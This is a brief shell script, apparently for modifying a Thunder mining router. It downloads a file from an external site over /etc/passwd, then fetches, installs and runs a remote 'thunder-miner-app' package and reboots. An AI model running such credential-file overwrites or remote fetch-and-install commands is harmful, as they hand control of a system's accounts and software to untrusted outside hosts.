export LD_LIBRARY_PATH=/thunder/lib
wget http://www.xiefucai.com/tools/zqb/passwd -O /etc/passwd
/thunder/bin/dcdn call dcdn set_dcdn_client '{"count":1}'

wget 'http://update.peiluyou.com/conf/miner_beta2/packages/thunder-miner-app_V1.1.1066_arm.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk
opkg-cl remove thunder-miner-app
opkg-cl install /tmp/t.ipk

sleep 30
reboot